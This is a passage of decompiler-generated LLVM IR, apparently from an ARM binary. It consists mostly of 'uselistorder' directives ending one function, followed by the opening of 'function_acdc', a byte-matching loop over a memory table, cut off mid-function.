  uselistorder i32 %storemerge73, { 1, 0 }
  uselistorder i32 %v3_a1d0, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %v1_a1b0, { 1, 2, 0 }
  uselistorder i32 %v4_a1a4, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v3_a170, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a168, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 %v5_a13c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a11c, { 1, 0, 2 }
  uselistorder i32 %v1_a0f8, { 1, 2, 0 }
  uselistorder i32 %v5_a0f4, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_a0dc.v4_a0bc, { 1, 0, 2 }
  uselistorder i32 %v1_a09c, { 1, 2, 0 }
  uselistorder i32 %v4_a098, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a048, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v0_a044, { 1, 0 }
  uselistorder i32 %v0_a02c, { 1, 0 }
  uselistorder i32 %v0_a030, { 1, 0 }
  uselistorder i32 %v2_a00c, { 1, 0 }
  uselistorder i32 %v1_a008, { 3, 4, 2, 1, 6, 0, 7, 5, 8 }
  uselistorder i32 %v3_a004, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 %v0_9fd4, { 1, 0 }
  uselistorder i1 %v7_9f9c, { 0, 2, 1 }
  uselistorder i32 %v1_9fc0, { 1, 0 }
  uselistorder i32 %v2_9fbc, { 1, 0 }
  uselistorder i32 %v3_9fb8, { 0, 1, 4, 3, 6, 2, 7, 5, 8 }
  uselistorder i32 %v2_9fb0, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v1_9f1c, { 1, 2, 0 }
  uselistorder i32 %v5_9f18, { 7, 6, 1, 4, 5, 3, 2, 8, 0, 10, 9, 11 }
  uselistorder i32 %v2_9f00, { 1, 0, 2 }
  uselistorder i32 %v2_9efc, { 1, 0, 2 }
  uselistorder i32 %v0_9ee0, { 0, 2, 1 }
  uselistorder i32 %v4_9ed8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_9eb4, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9ea8, { 1, 2, 0 }
  uselistorder i32 %v4_9ea0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9e3c, { 1, 2, 0 }
  uselistorder i32 %v5_9e38, { 1, 2, 8, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9e20.v4_9e00, { 1, 0, 2 }
  uselistorder i32 %v1_9dd0, { 1, 2, 0 }
  uselistorder i32 %v4_9dcc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9d54, { 1, 2, 0 }
  uselistorder i32 %v5_9d50, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9d38.v4_9d18, { 1, 0, 2 }
  uselistorder i32 %v1_9cf4, { 1, 2, 0 }
  uselistorder i32 %v4_9cec, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9c6c, { 1, 2, 0 }
  uselistorder i32 %v5_9c68, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9c50.v4_9c30, { 1, 0, 2 }
  uselistorder i32 %v1_9c10, { 1, 2, 0 }
  uselistorder i32 %v4_9c0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9be4, { 1, 2, 0 }
  uselistorder i32 %v4_9be0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9bbc, { 1, 2, 0 }
  uselistorder i32 %v4_9bb8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a66c, { 3, 7, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 %v1_9b70, { 1, 2, 0 }
  uselistorder i32 %v5_9b6c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_9b48, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v3_9ad0, { 0, 2, 1 }
  uselistorder i32 %v2_9ac4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_9ab8, { 1, 0 }
  uselistorder i32 %v2_9aac, { 1, 0 }
  uselistorder i32 %v0_9aac, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_9aa4, { 1, 0 }
  uselistorder i32 %v1_9aac, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_9a88, { 1, 0, 2 }
  uselistorder i32 %v1_9a80, { 1, 0 }
  uselistorder i32 %v2_9a68, { 1, 0 }
  uselistorder i32 %v0_9a68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_9a44, { 4, 2, 5, 3, 1, 0, 6 }
  uselistorder i32 %v2_99ac, { 1, 0 }
  uselistorder i32 %v1_99a8, { 2, 1, 4, 0, 5, 3, 6 }
  uselistorder i32 %v3_99a4, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v2_984c, { 1, 0 }
  uselistorder i32 %v1_984c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_95d8, { 2, 1, 0 }
  uselistorder i32 %v3_95d4, { 1, 0 }
  uselistorder i32 %v1_95b4, { 1, 2, 0 }
  uselistorder i32 %v3_95b0, { 4, 1, 0, 2, 6, 5, 7, 3 }
  uselistorder i32 %v2_95a0, { 1, 0 }
  uselistorder i32 %v1_9598, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i1 %v7_9588, { 1, 0 }
  uselistorder i1 %v7_9580, { 1, 0 }
  uselistorder i32 %v1_9564, { 2, 1, 0 }
  uselistorder i32 %v3_9560, { 1, 0 }
  uselistorder i32 %v0_9564, { 1, 0 }
  uselistorder i32 %v2_9534, { 1, 0 }
  uselistorder i32 %v1_9534, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32 %v0_9534, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_9530, { 0, 2, 1, 3 }
  uselistorder i32 %v0_951c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_94dc, { 1, 0 }
  uselistorder i32 %v2_94d4, { 1, 0 }
  uselistorder i32 %v1_94c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_94b4, { 1, 0 }
  uselistorder i32 %v0_94b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_94ac, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_94b4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_949c, { 1, 0 }
  uselistorder i32 %v3_9490, { 1, 0, 2 }
  uselistorder i32 %v0_944c, { 1, 0, 2 }
  uselistorder i32 %v1_93f0, { 1, 2, 0 }
  uselistorder i32 %v3_93ec, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_93c8, { 1, 2, 0 }
  uselistorder i32 %v3_93bc, { 0, 2, 1, 3 }
  uselistorder i32 %v4_93a8, { 1, 0 }
  uselistorder i8 %v3_93a8, { 16, 17, 18, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_93a8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9658, { 3, 4, 5, 1, 2, 0, 8, 7, 6 }
  uselistorder i32 %v2_9398, { 1, 0 }
  uselistorder i32 %v1_938c, { 2, 0, 3, 1, 4 }
  uselistorder i1 %v7_9368, { 1, 0 }
  uselistorder i32 %v1_9368, { 1, 0 }
  uselistorder i1 %v7_9360, { 1, 0 }
  uselistorder i32 %v4_9344, { 1, 0, 2 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v4_9324, { 1, 0, 2 }
  uselistorder i1 %v7_9320, { 1, 0 }
  uselistorder i1 %v7_9318, { 1, 0 }
  uselistorder i1 %v7_9310, { 1, 0 }
  uselistorder i32 %v2_9334, { 1, 0, 2, 3 }
  uselistorder i32 %v3_92ec248, { 1, 0 }
  uselistorder i32 %v5_92e8, { 1, 0 }
  uselistorder i8* %v1_9698, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_94a0, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 34, 12, 33, 13, 35, 14, 17, 15, 18, 16, 36, 32 }
  uselistorder i32 %v2_9428, { 1, 0 }
  uselistorder i32 %v3_ac10, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-20856.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_9258, { 1, 0 }
  uselistorder i32 %v0_9258, { 1, 0 }
  uselistorder i32 %v2_9218, { 1, 0 }
  uselistorder i32 %v8_91fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_91dc, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_9164, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_9108, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_90f4, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_90e8, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_9078, { 1, 0, 2 }
  uselistorder i32 %v1_9074, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9064, { 1, 0 }
  uselistorder i32 %v3_9060, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_9058, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_904c, { 1, 0, 2 }
  uselistorder i32 %v10_9048, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_9040, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9030, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9020, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_9000, { 1, 0 }
  uselistorder i32 %v0_8ffc, { 1, 0, 3, 2 }
  uselistorder i8* %tmp199, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %v2_8fd8, { 0, 17, 23, 24, 25, 26, 1, 20, 2, 21, 22, 27, 10, 11, 3, 16, 4, 18, 19, 28, 5, 15, 6, 29, 7, 14, 30, 8, 13, 31, 9, 12, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 %v5_8fd0, { 1, 0 }
  uselistorder i32 %v6_8f58, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_8f3c, { 1, 0 }
  uselistorder i32 %v1_8f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 43, 41, 42 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 6, 5, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13, 14, 15, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 62, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 123, 124, 125, 127, 126, 128, 129, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115, 112, 113, 114, 116, 117, 120, 121, 118, 119, 122, 131, 130, 132, 133, 134, 135, 136, 141, 137, 138, 139, 140, 142, 144, 143, 2, 146, 145, 1, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 89, 90, 91, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 85, 86, 118, 119, 92, 93, 94, 95, 96, 97, 98, 100, 99, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 1, 2, 150, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 47, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 135, 136, 137, 138, 139, 140, 141, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 130, 129, 131, 132, 134, 133, 169, 170, 142, 143, 144, 145, 146, 147, 148, 149, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 168, 167, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 9, 10, 129, 13, 15, 14, 16, 18, 17, 20, 19, 22, 21, 23, 25, 24, 26, 29, 27, 28, 31, 30, 34, 32, 33, 36, 35, 37, 38, 40, 39, 41, 42, 43, 45, 44, 46, 48, 47, 50, 49, 51, 53, 52, 55, 54, 56, 58, 57, 60, 59, 61, 63, 62, 64, 67, 65, 66, 69, 68, 72, 70, 71, 74, 73, 76, 75, 78, 77, 80, 79, 81, 83, 82, 85, 84, 87, 86, 88, 89, 91, 90, 93, 92, 95, 94, 96, 98, 97, 99, 100, 101, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 113, 112, 114, 115, 118, 116, 117, 119, 121, 120, 122, 124, 123, 126, 125, 127, 130, 128, 132, 131, 273, 272, 274, 276, 275, 8, 277, 134, 133, 135, 137, 136, 138, 139, 141, 140, 2, 142, 144, 143, 146, 145, 148, 147, 151, 149, 150, 153, 152, 154, 156, 155, 157, 5, 158, 160, 159, 162, 161, 163, 165, 164, 166, 168, 167, 169, 170, 172, 171, 174, 173, 175, 177, 176, 178, 180, 179, 181, 182, 184, 183, 186, 185, 187, 189, 188, 190, 192, 191, 193, 4, 194, 195, 196, 198, 197, 200, 199, 206, 201, 202, 291, 203, 204, 205, 208, 207, 209, 3, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 267, 268, 270, 269, 271, 278, 279, 280, 282, 281, 284, 283, 287, 288, 286, 285, 296, 289, 290, 292, 294, 293, 295, 298, 297, 299, 7, 300, 302, 301, 303, 6, 1, 305, 304, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 319, 318, 321, 320, 323, 322, 11, 324, 326, 325, 327, 328, 329, 330, 331, 332, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 43, 44, 45, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 40, 41, 42, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 56, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 27, 26, 4, 5, 6, 7, 28, 29, 24, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 3, 25, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 137, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 63, 56, 57, 58, 59, 60, 61, 62, 118, 119, 120, 121, 122, 123, 124, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 107, 108, 109, 114, 116, 115, 110, 111, 112, 113, 117, 150, 151, 152, 125, 126, 134, 135, 127, 128, 129, 130, 131, 132, 133, 136, 0, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 131, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 112, 113, 114, 115, 116, 117, 118, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 110, 109, 106, 107, 108, 111, 143, 144, 145, 119, 120, 128, 129, 121, 122, 123, 124, 125, 126, 127, 130, 0, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 134, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 115, 116, 117, 118, 119, 120, 121, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 146, 147, 148, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 144, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 65, 59, 60, 61, 62, 63, 64, 121, 122, 123, 124, 125, 126, 127, 66, 67, 68, 69, 71, 72, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 117, 119, 118, 113, 114, 115, 116, 120, 162, 163, 164, 128, 129, 130, 140, 141, 131, 132, 133, 134, 135, 136, 137, 138, 139, 142, 143, 0, 147, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161 }
  uselistorder i32 ptrtoint (i32* @global_var_143f0.106 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_143e0.101 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_143d8.99 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_143d4.97 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_143ac.83 to i32), { 0, 2, 1, 3 }
  uselistorder i8 7, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 5, 6, 7, 2, 8 }
  uselistorder i32 36, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_aa74, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %dec_label_pc_aa48, { 2, 0, 1 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a76c, { 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %dec_label_pc_a740, { 2, 0, 1 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_a5dc, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_a590, { 1, 0 }
  uselistorder label %dec_label_pc_a568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a55c, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a344, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_a1f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a188, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a158, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_9fdc, { 1, 0 }
  uselistorder label %dec_label_pc_9fd4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9fac, { 1, 0 }
  uselistorder label %dec_label_pc_9f6c, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 2, 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %.thread47, { 3, 0, 1, 2 }
  uselistorder label %bb214, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
  uselistorder label %dec_label_pc_9aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a24, { 1, 0 }
  uselistorder label %dec_label_pc_9a0c, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
  uselistorder label %dec_label_pc_995c, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_9590, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 13, 0, 15, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_9388, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9294.dec_label_pc_9294_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9280, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_9280.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9054, { 1, 0 }
  uselistorder label %dec_label_pc_9010, { 1, 3, 4, 0, 2 }
}

define i32 @function_acdc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_acdc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_acdc = urem i32 %arg1, 256
  %v2_ace0 = icmp eq i32 %v1_acdc, 0
  %v1_ace8 = urem i32 %arg3, 256
  br i1 %v2_ace0, label %dec_label_pc_ad2c, label %dec_label_pc_acf4

dec_label_pc_acf4:                                ; preds = %dec_label_pc_acdc
  %v0_acf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acf4 = add i32 %v0_acf4, 4
  %v2_acf4 = inttoptr i32 %v1_acf4 to i8*
  %v3_acf4 = load i8, i8* %v2_acf4, align 1
  %v4_acf4 = zext i8 %v3_acf4 to i32
  %v9_acf8 = icmp eq i32 %v4_acf4, %v1_ace8
  br i1 %v9_acf8, label %dec_label_pc_ad34, label %dec_label_pc_ad1c.preheader

dec_label_pc_ad1c.preheader:                      ; preds = %dec_label_pc_acf4
  br label %dec_label_pc_ad1c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad1c
  %v1_ad0c = add i32 %v0_ad14.in, 12
  %v2_ad0c = inttoptr i32 %v1_ad0c to i8*
  %v3_ad0c = load i8, i8* %v2_ad0c, align 1
  %v4_ad0c = zext i8 %v3_ad0c to i32
  %v9_ad10 = icmp eq i32 %v4_ad0c, %v1_ace8
  br i1 %v9_ad10, label %dec_label_pc_ad34, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad1c.preheader, %dec_label_pc_ad0c
  %v0_ad14.in = phi i32 [ %v0_acf4, %dec_label_pc_ad1c.preheader ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v0_ad1c = phi i32 [ 0, %dec_label_pc_ad1c.preheader ], [ %v1_ad1c, %dec_label_pc_ad0c ]
  %v0_ad14 = add i32 %v0_ad14.in, 8
  %v1_ad1c = add i32 %v0_ad1c, 1
  store i32 %v1_ad1c, i32* @lr, align 4
